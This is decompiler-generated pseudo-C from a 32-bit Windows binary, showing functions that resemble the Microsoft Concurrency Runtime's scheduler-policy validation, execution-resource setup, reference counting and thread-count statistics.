int __thiscall sub_4794AF(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 108))(*(_DWORD *)(this + 112));
}

//----- (004794C3) --------------------------------------------------------
unsigned int __thiscall sub_4794C3(int this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v5; // esi
  unsigned int v6; // ecx
  unsigned int v7; // eax
  void *v8; // esp
  _DWORD *v9; // eax
  _DWORD *v10; // edx
  signed int v11; // esi
  int i; // ecx
  _DWORD v14[4]; // [esp+0h] [ebp-2Ch] BYREF
  void **v15; // [esp+10h] [ebp-1Ch] BYREF
  int v16; // [esp+14h] [ebp-18h]
  int v17; // [esp+18h] [ebp-14h]
  int v18; // [esp+28h] [ebp-4h]

  v3 = a2;
  v4 = a2;
  v5 = 0;
  if ( !a2 )
    return sub_46E7F6((_DWORD ***)(this + 60), 0xFFFFFFFF);
  do
  {
    v4 = *(_DWORD *)(v4 + 104);
    ++v5;
  }
  while ( v4 );
  if ( v5 <= 0 )
    return sub_46E7F6((_DWORD ***)(this + 60), 0xFFFFFFFF);
  v15 = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  v16 = 0;
  v17 = 0;
  v6 = 4 * v5 + 12;
  v18 = 0;
  v7 = 4 * v5 + 4 < v6 ? v6 : 0;
  if ( !v7 )
  {
    v9 = 0;
    goto LABEL_12;
  }
  if ( v7 > 0x400 )
  {
    v9 = malloc(4 * v5 + 4 < v6 ? v6 : 0);
    if ( v9 )
    {
      *v9 = 56797;
      goto LABEL_10;
    }
  }
  else
  {
    v8 = alloca(v7);
    v9 = v14;
    if ( v14 )
    {
      v14[0] = 52428;
LABEL_10:
      v9 += 2;
    }
  }
LABEL_12:
  v10 = (_DWORD *)sub_46E369(&v15, (int)v9);
  v11 = v5 + 1;
  *v10 = *(_DWORD *)(this + 100) + 60;
  for ( i = 1; i < v11; v3 = *(_DWORD *)(v3 + 104) )
    v10[i++] = v3 + 60;
  sub_46E9BA(v10, v11, 1, 0xFFFFFFFF);
  return _freea_crt(v16);
}
// 46C0C7: using guessed type _DWORD __cdecl _freea_crt(_DWORD);
// 4C0D0C: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (004795A0) --------------------------------------------------------
char __thiscall sub_4795A0(int this)
{
  volatile __int32 *v1; // esi
  signed __int32 v2; // eax
  char v4[8]; // [esp+Ch] [ebp-10h] BYREF
  int v5; // [esp+14h] [ebp-8h]
  int (*v6)(); // [esp+18h] [ebp-4h]

  v1 = (volatile __int32 *)(this + 20);
  v2 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 20), -2147483647, 0x80000000);
  if ( v2 == 0x80000000 )
  {
    *(_DWORD *)(this + 28) = 0;
    LOBYTE(v2) = _InterlockedExchange(v1, 0);
  }
  else
  {
    v5 = 0;
    v6 = sub_46FD09;
    while ( *(int *)v1 <= -2147483647 )
      LOBYTE(v2) = sub_46E3D5((int)v4);
  }
  return v2;
}
// 4795A0: using guessed type char var_10[8];

//----- (004795EB) --------------------------------------------------------
_DWORD *__thiscall sub_4795EB(_DWORD *this)
{
  this[12] = 0;
  this[13] = 0;
  this[31] = 0;
  this[7] = 0;
  return sub_46ED55(this + 8);
}

//----- (00479601) --------------------------------------------------------
signed __int32 __thiscall sub_479601(volatile signed __int32 *this)
{
  signed __int32 CurrentThreadId; // ebx

  CurrentThreadId = GetCurrentThreadId();
  if ( !sub_4789C2(this + 2, CurrentThreadId, 0) )
  {
    (*(void (__thiscall **)(volatile signed __int32 *))(*this + 8))(this);
    if ( sub_4789C2(this + 2, 3, CurrentThreadId) == 2 )
    {
      sub_404D40((_Mtx_t)(this + 13));
      *((_BYTE *)this + 100) = 1;
      sub_404D70((_Mtx_t)(this + 13));
      std::_Cnd_broadcastX((_Cnd_t)(this + 3));
    }
  }
  return sub_4797C2(this);
}
// 479334: using guessed type _DWORD __cdecl std::_Cnd_broadcastX(_Cnd_t);

//----- (00479689) --------------------------------------------------------
bool __thiscall sub_479689(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) == 0;
}

//----- (0047969B) --------------------------------------------------------
bool __thiscall sub_47969B(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) != 0;
}

//----- (004796AD) --------------------------------------------------------
bool __thiscall sub_4796AD(_DWORD *this)
{
  return *(_DWORD *)(this[25] + 52) != 0;
}

//----- (004796B8) --------------------------------------------------------
bool __thiscall sub_4796B8(_DWORD *this)
{
  return (this[30] & 2) != 0;
}

//----- (004796C0) --------------------------------------------------------
int __thiscall sub_4796C0(int this, int a2)
{
  int (__cdecl *v3)(int); // edi
  int v4; // ebx
  int result; // eax

  if ( *(_BYTE *)(a2 + 16) )
    sub_48119E((int (__thiscall ***)(_DWORD, int))a2);
  v3 = *(int (__cdecl **)(int))(this + 136);
  v4 = *(_DWORD *)(this + 140);
  result = _InterlockedDecrement((volatile signed __int32 *)(this + 16));
  if ( !result )
    result = sub_46E673((volatile __int32 *)(this + 60));
  if ( v3 )
    return v3(v4);
  return result;
}

//----- (0047970F) --------------------------------------------------------
int __thiscall sub_47970F(_DWORD *this)
{
  return this[25];
}

//----- (00479713) --------------------------------------------------------
int __thiscall sub_479713(void *this, int a2, int a3, int a4)
{
  void *v5; // eax
  int v6; // esi

  v5 = operator new(0x74u);
  if ( v5 )
    v6 = sub_4789E7((int)v5, a2, a3, a4);
  else
    v6 = 0;
  sub_479750((int)this, v6);
  return v6;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00479750) --------------------------------------------------------
int __thiscall sub_479750(int this, int a2)
{
  char v3; // bl
  int result; // eax

  _InterlockedExchange((volatile __int32 *)(a2 + 8), 0);
  _InterlockedIncrement((volatile signed __int32 *)(a2 + 4));
  *(_DWORD *)(a2 + 104) = this;
  v3 = 1;
  if ( *(_DWORD *)(this + 8) )
    return sub_479601((volatile signed __int32 *)a2);
  sub_404D40((_Mtx_t)(this + 12));
  if ( !*(_DWORD *)(this + 8) )
  {
    v3 = 0;
    sub_4799C5((_DWORD *)(this + 60), a2);
  }
  result = sub_404D70((_Mtx_t)(this + 12));
  if ( v3 )
    return sub_479601((volatile signed __int32 *)a2);
  return result;
}

//----- (004797C2) --------------------------------------------------------
signed __int32 __thiscall sub_4797C2(volatile signed __int32 *this)
{
  signed __int32 v1; // edi

  v1 = _InterlockedDecrement(this + 1);
  if ( !v1 )
    (*(void (__thiscall **)(volatile signed __int32 *))(*this + 4))(this);
  return v1;
}

//----- (004797E9) --------------------------------------------------------
void __thiscall sub_4797E9(volatile signed __int32 *this)
{
  volatile signed __int32 *v2; // edi
  signed __int32 v3; // ecx
  signed __int32 v4; // eax

  v2 = this + 30;
  v3 = *((_DWORD *)this + 30);
  if ( (v3 & 2) != 0 )
  {
LABEL_4:
    sub_478C05((int)this);
    sub_46C87D((void *)this);
  }
  else
  {
    while ( 1 )
    {
      v4 = _InterlockedCompareExchange(v2, v3 | 2, v3);
      if ( v4 == v3 )
        break;
      v3 = v4;
      if ( (v4 & 2) != 0 )
        goto LABEL_4;
    }
  }
}

//----- (00479823) --------------------------------------------------------
void __thiscall sub_479823(int this, int a2)
{
  int v2; // edi
  volatile signed __int32 *v4; // eax
  int v5; // ecx
  volatile signed __int32 *v6; // ebx
  signed __int32 v7; // edx
  signed __int32 v8; // eax
  char v9[8]; // [esp+Ch] [ebp-28h] BYREF
  int v10; // [esp+14h] [ebp-20h]
  int (*v11)(); // [esp+18h] [ebp-1Ch]
  char v12[8]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-10h]
  int (*v14)(); // [esp+28h] [ebp-Ch]
  int v15; // [esp+2Ch] [ebp-8h]
  volatile signed __int32 *v16; // [esp+30h] [ebp-4h]

  v2 = a2;
  while ( 2 )
  {
    v4 = (volatile signed __int32 *)sub_475051();
    v5 = *(_DWORD *)(this + 12);
    v6 = (volatile signed __int32 *)(this + 56);
    v16 = v4;
    v15 = v5;
LABEL_3:
    v7 = *v6;
    while ( 1 )
    {
      if ( v7 == 9 )
      {
        v13 = 0;
        v14 = sub_46FD09;
        if ( *v6 == 9 )
        {
          do
            sub_46E3D5((int)v12);
          while ( *v6 == 9 );
          v4 = v16;
          v5 = v15;
        }
        goto LABEL_3;
      }
      if ( v4 == (volatile signed __int32 *)v5 )
        break;
      v8 = _InterlockedCompareExchange(v6, 0, 3);
      if ( v8 != 9 )
        goto LABEL_13;
LABEL_18:
      v5 = v15;
      v7 = v8;
      v4 = v16;
    }
    v8 = _InterlockedCompareExchange(v6, 0, v7);
    if ( v8 != v7 )
      goto LABEL_18;
    if ( v8 == 4 )
      sub_477DFD(v16, (16 * *(_DWORD *)(this + 4)) >> 4);
    *(_DWORD *)(this + 4) |= 0xFFFFFFFu;
LABEL_13:
    if ( *(_DWORD *)(this + 100) == this )
    {
      while ( v2 )
      {
        if ( (*(_DWORD *)(v2 + 120) & 2) == 0 )
          sub_479823(0);
        v2 = *(_DWORD *)(v2 + 104);
      }
      if ( _InterlockedExchange((volatile __int32 *)(this + 52), 0) < 0 )
      {
        v10 = 0;
        v11 = sub_46FD09;
        while ( *(_DWORD *)(this + 24) == 8 )
          sub_46E3D5((int)v9);
        sub_480CD5((_DWORD *)this);
      }
    }
    else if ( sub_479689((_DWORD *)this) && a2 )
    {
      this = *(_DWORD *)(this + 100);
      continue;
    }
    break;
  }
}
// 479823: using guessed type char var_18[8];
// 479823: using guessed type char var_28[8];

//----- (0047991E) --------------------------------------------------------
char __thiscall sub_47991E(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v2 = *((_DWORD *)this + 13);
  if ( (v2 & 0x3FFFFFFF) != 0 )
    return 0;
  while ( 1 )
  {
    v3 = _InterlockedCompareExchange(this + 13, a2 | v2 & 0xC0000000, v2);
    if ( v3 == v2 )
      break;
    v2 = v3;
    if ( (v3 & 0x3FFFFFFF) != 0 )
      return 0;
  }
  return 1;
}

//----- (00479958) --------------------------------------------------------
char __cdecl sub_479958(int a1, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 8);
  ++*(_DWORD *)(a2 + 4);
  sub_4796C0(v2, a1);
  return 1;
}

//----- (00479971) --------------------------------------------------------
bool __thiscall sub_479971(_DWORD *this, char a2)
{
  bool v3; // bl
  int i; // eax
  bool v5; // zf

  v3 = 0;
  if ( sub_479689(this) )
    return !v3;
  if ( (unsigned __int8)__uncaught_exception() )
    goto LABEL_10;
  v3 = this[4] > 0;
  if ( (_DWORD *)this[25] == this )
  {
    for ( i = this[26]; i; i = *(_DWORD *)(i + 104) )
    {
      if ( *(int *)(i + 16) > 0 )
        v3 = 1;
    }
  }
  v5 = !v3;
  if ( v3 )
  {
LABEL_10:
    sub_478E8B((int)this, a2);
    return !v3;
  }
  return v5;
}
// 484EF7: using guessed type int __uncaught_exception(void);

//----- (004799C5) --------------------------------------------------------
_DWORD *__thiscall sub_4799C5(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  _DWORD *v4; // edx

  result = operator new(8u);
  v4 = result;
  if ( result )
  {
    result[1] = 0;
    *result = a2;
  }
  else
  {
    v4 = 0;
  }
  if ( *this )
  {
    result = (_DWORD *)this[1];
    result[1] = v4;
  }
  else
  {
    *this = v4;
  }
  this[1] = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00479A01) --------------------------------------------------------
void __thiscall sub_479A01(_DWORD *this, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // edx
  int v4; // esi

  v2 = (_DWORD *)*this;
  v3 = 0;
  if ( *this )
  {
    while ( 1 )
    {
      v4 = v2[1];
      if ( *v2 == a2 )
        break;
      v3 = v2;
      v2 = (_DWORD *)v2[1];
      if ( !v4 )
        return;
    }
    if ( v3 )
      v3[1] = v4;
    else
      *this = v4;
    if ( !v2[1] )
      this[1] = v3;
    sub_46C87D(v2);
  }
}

//----- (00479A46) --------------------------------------------------------
unsigned int *__cdecl sub_479A46(unsigned int *a1, unsigned int a2, char a3)
{
  char *v4; // [esp+0h] [ebp-4h] BYREF

  v4 = &a3;
  sub_479B59(a1, a2, (int *)&v4);
  return a1;
}

//----- (00479A64) --------------------------------------------------------
_DWORD *__thiscall sub_479A64(_DWORD *this, const void **a2)
{
  void *v3; // eax

  v3 = operator new(0x28u);
  *this = v3;
  memmove(v3, *a2, 0x28u);
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00479A8A) --------------------------------------------------------
char *__thiscall sub_479A8A(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 4C0B9C: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (00479AA5) --------------------------------------------------------
char *__thiscall sub_479AA5(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_thread_specification::`vftable';
  return this;
}
// 4C0BB4: using guessed type void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable';

//----- (00479AC0) --------------------------------------------------------
char *__thiscall sub_479AC0(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 4C0BA8: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (00479ADB) --------------------------------------------------------
void __thiscall sub_479ADB(void **this)
{
  sub_46C87D(*this);
}

//----- (00479AE7) --------------------------------------------------------
void **__thiscall sub_479AE7(void **this, const void **a2)
{
  memmove(*this, *a2, 0x28u);
  return this;
}

//----- (00479B05) --------------------------------------------------------
int __thiscall sub_479B05(_DWORD *this, unsigned int a2)
{
  char *v3; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( a2 > 9 )
  {
    v3 = sub_479C8E(a2);
    sub_47784E(pExceptionObject, (int)v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__);
  }
  return *(_DWORD *)(*this + 4 * a2);
}

//----- (00479B3B) --------------------------------------------------------
bool __cdecl sub_479B3B(unsigned int a1, unsigned int a2)
{
  return a2 == -1 || a1 == -1 || a2 >= a1;
}

//----- (00479B59) --------------------------------------------------------
unsigned int __thiscall sub_479B59(unsigned int *this, unsigned int a2, int *a3)
{
  void *v4; // ebx
  unsigned int v5; // esi
  unsigned int v6; // edi
  int v7; // eax
  int v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v12; // eax
  _ThrowInfo *v13; // [esp-4h] [ebp-54h]
  char v14[12]; // [esp+10h] [ebp-40h] BYREF
  char pExceptionObject[12]; // [esp+1Ch] [ebp-34h] BYREF
  char v16[12]; // [esp+28h] [ebp-28h] BYREF
  void *v17; // [esp+34h] [ebp-1Ch]
  unsigned int *v18; // [esp+38h] [ebp-18h]
  int v19; // [esp+3Ch] [ebp-14h]
  int v20; // [esp+4Ch] [ebp-4h]

  v18 = this;
  v4 = operator new(0x28u);
  v5 = 0;
  v17 = v4;
  *this = (unsigned int)v4;
  v20 = 0;
  memmove(v4, &unk_4E81A8, 0x28u);
  while ( v5 < a2 )
  {
    *a3 += 4;
    v6 = *(_DWORD *)(*a3 - 4);
    v7 = *a3 + 4;
    *a3 = v7;
    v8 = *(_DWORD *)(v7 - 4);
    v19 = v8;
    if ( v6 > 9 )
    {
      v12 = sub_479C8E(v6);
      sub_47784E(v16, (int)v12);
      v13 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__;
      v10 = v16;
LABEL_11:
      _CxxThrowException(v10, v13);
    }
    if ( !sub_479CA5(v6, v8) )
    {
      v9 = sub_479C8E(v6);
      sub_47787A(pExceptionObject, (int)v9);
      v13 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__;
      v10 = pExceptionObject;
      goto LABEL_11;
    }
    ++v5;
    *((_DWORD *)v4 + v6) = v19;
  }
  if ( !sub_479B3B(*(_DWORD *)(*v18 + 8), *(_DWORD *)(*v18 + 4)) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v14);
    v13 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;
    v10 = v14;
    goto LABEL_11;
  }
  return sub_479C45(v18);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 477869: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E513C: using guessed type __TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;

//----- (00479C45) --------------------------------------------------------
unsigned int __thiscall sub_479C45(unsigned int *this)
{
  unsigned int v2; // eax
  _DWORD *v3; // esi
  unsigned int v4; // edx
  unsigned int v5; // edi
  unsigned int result; // eax

  *(_DWORD *)*this = 0;
  v2 = sub_471D0E();
  v3 = (_DWORD *)*this;
  v4 = v2;
  v5 = *(_DWORD *)(*this + 8);
  result = *(_DWORD *)(*this + 4);
  if ( v5 == -1 )
  {
    if ( result == -1 )
    {
      v3[1] = v4;
      result = *this;
      *(_DWORD *)(*this + 8) = v4;
    }
    else
    {
      if ( result >= v4 )
        result = v4;
      v3[2] = result;
    }
  }
  else if ( result == -1 )
  {
    if ( v5 <= v4 )
      v5 = v4;
    v3[1] = v5;
  }
  return result;
}

//----- (00479C8E) --------------------------------------------------------
char *__cdecl sub_479C8E(unsigned int a1)
{
  int v1; // eax

  v1 = a1;
  if ( a1 > 0xA )
    v1 = 10;
  return off_4E81D0[v1];
}
// 4E81D0: using guessed type char *off_4E81D0[11];

//----- (00479CA5) --------------------------------------------------------
bool __cdecl sub_479CA5(int a1, int a2)
{
  char v2; // cl
  bool v3; // zf

  v2 = 1;
  switch ( a1 )
  {
    case 0:
      return a2 == 0;
    case 1:
      if ( a2 > 0 )
        return v2;
      v3 = a2 == -1;
      break;
    case 2:
      if ( (unsigned int)a2 <= 0x7FFFFFFF )
        return v2;
      v3 = a2 == -1;
      break;
    case 3:
      if ( a2 <= 0 )
        return 0;
      return v2;
    case 4:
    case 5:
      return (unsigned int)a2 <= 0x7FFFFFFF;
    case 6:
      if ( a2 >= -7 && a2 < 7 || a2 == 15 || a2 == -15 )
        return v2;
      v3 = a2 == 61440;
      break;
    case 7:
      if ( !a2 )
        return v2;
      v3 = a2 == 1;
      break;
    case 8:
      if ( a2 == 1 )
        return v2;
      v3 = a2 == 0;
      break;
    case 9:
      if ( a2 )
        return a2 == 1;
      return v2;
    default:
      terminate(1);
  }
  if ( !v3 )
    return 0;
  return v2;
}
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00479D85) --------------------------------------------------------
int __thiscall sub_479D85(int *this)
{
  int result; // eax
  char *v2; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = *this;
  if ( !*(_DWORD *)(*this + 8) )
  {
    v2 = sub_479C8E(2u);
LABEL_6:
    sub_47787A(pExceptionObject, (int)v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
  }
  if ( !*(_DWORD *)(result + 32) )
  {
    v2 = sub_479C8E(8u);
    goto LABEL_6;
  }
  return result;
}

//----- (00479DBF) --------------------------------------------------------
_DWORD *__thiscall sub_479DBF(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = a3[4];
  this[12] = 0;
  this[10] = a4;
  result = this;
  this[11] = (a3[3] << 8) + *(unsigned __int8 *)(a3[12] + 52 * a4 + 8);
  return result;
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (00479E1D) --------------------------------------------------------
_DWORD *__thiscall sub_479E1D(_DWORD *this, int a2, _DWORD *a3)
{
  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[7] = 0;
  this[8] = 0;
  this[6] = a3;
  this[9] = a3[9];
  this[10] = a3[10];
  this[12] = 0;
  this[11] = a3[11];
  return this;
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (00479E6B) --------------------------------------------------------
int __thiscall sub_479E6B(_DWORD *this)
{
  return sub_470737(*(_DWORD *)(this[5] + 12), this[9], this[10]);
}

//----- (00479E7D) --------------------------------------------------------
void __thiscall sub_479E7D(DWORD_PTR *this)
{
  DWORD_PTR v3; // edi
  HANDLE CurrentThread; // eax

  if ( this[12]-- == 1 )
  {
    v3 = this[7];
    sub_47A014((int)this);
    if ( this[6] )
    {
      sub_479E7D();
      sub_47B652((_DWORD *)this[5], this);
    }
    else
    {
      sub_47AE61((_DWORD *)this[5], this[9], this[10], v3 == 0);
      if ( !v3 )
      {
        CurrentThread = GetCurrentThread();
        sub_4701F5(this + 2, CurrentThread);
        sub_47AE17((_DWORD *)this[5], (int)this);
        sub_47AEF5(this[5], this);
      }
    }
  }
}

//----- (00479EE5) --------------------------------------------------------
int __thiscall sub_479EE5(_DWORD *this)
{
  return this[11];
}

//----- (00479EE9) --------------------------------------------------------
int __thiscall sub_479EE9(_DWORD *this)
{
  return this[9];
}

//----- (00479EED) --------------------------------------------------------
int __thiscall sub_479EED(int this)
{
  int v1; // esi
  int v2; // ecx
  int result; // eax
  _DWORD *v4; // ecx
  int v5; // edi
  HANDLE CurrentThread; // ebx
  _DWORD *v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned __int16 v10; // cx
  DWORD_PTR v11; // esi
  int v13[3]; // [esp+8h] [ebp-1Ch] BYREF
  DWORD_PTR v14[3]; // [esp+14h] [ebp-10h] BYREF

  v1 = this;
  v2 = *(_DWORD *)(this + 48);
  result = v2 + 1;
  *(_DWORD *)(this + 48) = v2 + 1;
  if ( !v2 )
  {
    v4 = *(_DWORD **)(v1 + 20);
    v5 = *(_DWORD *)(v1 + 28);
    if ( *(_DWORD *)(v1 + 24) )
    {
      sub_47AA86(v4, v1);
    }
    else
    {
      sub_47B403(v4, *(_DWORD *)(v1 + 36), *(_DWORD *)(v1 + 40), v5 == 0);
      if ( !v5 )
      {
        CurrentThread = GetCurrentThread();
        v7 = sub_46FD52(v13, (int)CurrentThread);
        *(_WORD *)(v1 + 12) = *((_WORD *)v7 + 2);
        *(_DWORD *)(v1 + 8) = *v7;
        v8 = 52 * *(_DWORD *)(v1 + 36);
        v9 = *(_DWORD *)(*(_DWORD *)(v1 + 20) + 16);
        v10 = *(_WORD *)(v9 + v8 + 12);
        v11 = *(_DWORD *)(v9 + v8);
        v14[2] = 0;
        v14[1] = v10;
        v14[0] = v11;
        sub_4701F5(v14, CurrentThread);
        v1 = this;
        sub_47B3B5(*(_DWORD **)(this + 20), this);
        sub_47A9FF(*(_DWORD *)(v1 + 20), v1);
      }
    }
    return sub_47A030((_DWORD *)v1);
  }
  return result;
}
// 479EED: using guessed type int var_1C[3];

//----- (00479FB5) --------------------------------------------------------
void __thiscall sub_479FB5(DWORD_PTR *this, int a2)
{
  _DWORD *v3; // ecx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( sub_47B021((_DWORD *)this[5]) != this || (v3 = (_DWORD *)this[5], v3[2] != a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_4730C3(v3[3], this);
}
// 46FE7D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E4AD0: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (0047A014) --------------------------------------------------------
BOOL __thiscall sub_47A014(int this)
{
  BOOL result; // eax

  result = sub_46F93E(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 20) + 12) + 112), *(LPVOID *)(this + 32));
  *(_DWORD *)(this + 32) = 0;
  return result;
}

//----- (0047A030) --------------------------------------------------------
BOOL __thiscall sub_47A030(_DWORD *this)
{
  DWORD v2; // esi

  v2 = *(_DWORD *)(*(_DWORD *)(this[5] + 12) + 112);
  this[8] = sub_46F930(v2);
  return sub_46F93E(v2, this);
}

//----- (0047A053) --------------------------------------------------------
int __cdecl sub_47A053(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return a1 != 0 ? 1 : -1;
  return result;
}

//----- (0047A06B) --------------------------------------------------------
double __cdecl sub_47A06B(double a1)
{
  if ( 0.0 == a1 )
    return 0.0;
  if ( a1 <= 0.0 )
    return (double)-1;
  else
    return (double)1;
}

//----- (0047A0A3) --------------------------------------------------------
int __thiscall sub_47A0A3(int this, int a2, unsigned int a3, int a4)
{
  int v4; // eax
  int v5; // edx
  int result; // eax

  v4 = this + 8;
  v5 = 64;
  do
  {
    *(double *)(v4 - 8) = 0.0;
    *(double *)v4 = 0.0;
    *(_DWORD *)(v4 + 8) = 0;
    *(_DWORD *)(v4 + 12) = 0;
    *(_DWORD *)(v4 + 16) = 0;
    v4 += 32;
    --v5;
  }
  while ( v5 );
  *(_DWORD *)(this + 2048) = a4;
  *(_DWORD *)(this + 2076) = a2;
  *(_DWORD *)(this + 2068) = 0;
  *(_DWORD *)(this + 2072) = 0;
  *(_DWORD *)(this + 2080) = 0;
  *(_DWORD *)(this + 2084) = 0;
  *(_DWORD *)(this + 2088) = 0;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2096) = 0;
  *(_BYTE *)(this + 2100) = 1;
  *(_DWORD *)(this + 2064) = a3;
  result = this;
  *(double *)(this + 2056) = (double)a3;
  return result;
}

//----- (0047A130) --------------------------------------------------------
int __thiscall sub_47A130(double *this, double a2, int a3)
{
  int result; // eax
  double v4; // st7

  result = a3;
  v4 = *this + a2;
  ++*((_DWORD *)this + 4);
  *((_DWORD *)this + 6) = a3;
  *this = v4;
  this[1] = a2 * a2 + this[1];
  return result;
}

//----- (0047A153) --------------------------------------------------------
double __stdcall sub_47A153(unsigned int a1, unsigned int a2, int a3, int a4)
{
  return (double)a2 * 10.0 / (double)a1;
}

//----- (0047A18E) --------------------------------------------------------
double __thiscall sub_47A18E(char *this, int a2, int a3)
{
  char *v4; // ebx
  char *v5; // esi
  long double v6; // st6
  long double v7; // st7
  double v9; // [esp+14h] [ebp-18h]
  double v10; // [esp+1Ch] [ebp-10h]

  v4 = sub_47A30B(this, a2);
  v5 = sub_47A30B(this, a3);
  v10 = sub_47A37F((double *)v4);
  v6 = sub_47A37F((double *)v5) - v10;
  v9 = sub_47A62F((double *)v4) / (double)*((int *)v4 + 4);
  v7 = 0.0;
  if ( fabs(v6) > 0.0 )
    v7 = fabs(sqrt(sub_47A62F((double *)v5) / (double)*((int *)v5 + 4) + v9) / v6);
  return exp(v7 * -1.0) * (v6 / v10 / ((double)(a3 - a2) / (double)a2) - 0.15);
}

//----- (0047A249) --------------------------------------------------------
double __thiscall sub_47A249(int this)
{
  long double v3; // [esp+Ch] [ebp-8h]

  v3 = sqrt(sub_47A62F((double *)this)) / sqrt((double)*(int *)(this + 16));
  return v3 / sub_47A37F((double *)this);
}

//----- (0047A280) --------------------------------------------------------
unsigned int __thiscall sub_47A280(int this, int a2)
{
  unsigned int result; // eax
  int v4; // ecx
  char *v5; // eax

  result = a2;
  v4 = *(_DWORD *)(this + 2068);
  if ( a2 != v4 )
  {
    *(_DWORD *)(this + 2072) = v4;
    *(_DWORD *)(this + 2068) = a2;
    v5 = sub_47A30B((char *)this, a2);
    *(double *)v5 = 0.0;
    *((_DWORD *)v5 + 4) = 0;
    *((_DWORD *)v5 + 5) = 0;
    *((_DWORD *)v5 + 6) = 0;
    *((double *)v5 + 1) = 0.0;
    return sub_47A2C5((unsigned int *)this);
  }
  return result;
}

//----- (0047A2C5) --------------------------------------------------------
unsigned int __thiscall sub_47A2C5(unsigned int *this)
{
  unsigned int *v1; // edx
  int v2; // esi
  unsigned int result; // eax

  v1 = this + 5;
  v2 = 64;
  do
  {
    result = *v1;
    if ( *v1 != this[517] && result != this[518] )
    {
      result = this[521] - v1[1];
      if ( result > 0x32 )
      {
        *(v1 - 1) = 0;
        *v1 = 0;
        v1[1] = 0;
        *(double *)(v1 - 5) = 0.0;
        *(double *)(v1 - 3) = 0.0;
      }
    }
    v1 += 8;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (0047A30B) --------------------------------------------------------
char *__thiscall sub_47A30B(char *this, int a2)
{
  char *result; // eax

  result = &this[32 * (a2 & 0x3F)];
  if ( *((_DWORD *)result + 5) != a2 )
  {
    *((_DWORD *)result + 4) = 0;
    *((_DWORD *)result + 6) = 0;
    *(double *)result = 0.0;
    *((double *)result + 1) = 0.0;
    *((_DWORD *)result + 5) = a2;
  }
  return result;
}

//----- (0047A336) --------------------------------------------------------
BOOL __thiscall sub_47A336(_BYTE *this)
{
  char v1; // dl

  v1 = this[2100];
  this[2100] = v1 == 0;
  return v1 != 0;
}

//----- (0047A34F) --------------------------------------------------------
bool __stdcall sub_47A34F(int a1)
{
  return *(_DWORD *)(a1 + 16) > 5u || *(_DWORD *)(a1 + 16) >= 3u && fabs(sub_47A249(a1)) <= 0.004;
}

